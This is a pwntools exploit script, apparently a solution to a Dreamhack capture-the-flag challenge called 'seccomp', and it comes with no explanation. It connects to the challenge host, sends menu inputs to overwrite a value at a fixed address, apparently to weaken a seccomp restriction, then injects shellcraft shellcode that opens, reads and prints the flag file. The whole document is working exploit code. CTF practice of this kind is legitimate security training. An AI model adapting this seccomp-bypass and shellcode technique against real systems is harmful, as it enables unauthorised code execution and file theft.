from pwn import *
#p = process("./seccomp")
p = remote("host1.dreamhack.games", 10440)
pause()
context.arch = "x86_64"
p.sendline("3")
payload = str(0x602090)
p.sendline(payload)
sleep(0.1)
p.sendline("0")
p.sendline("1")
payload = shellcraft.open("./flag")
payload += shellcraft.read("rax", "rsp", 100)
payload += shellcraft.write(1, "rsp", 100)
p.sendline(asm(payload))
p.interactive()
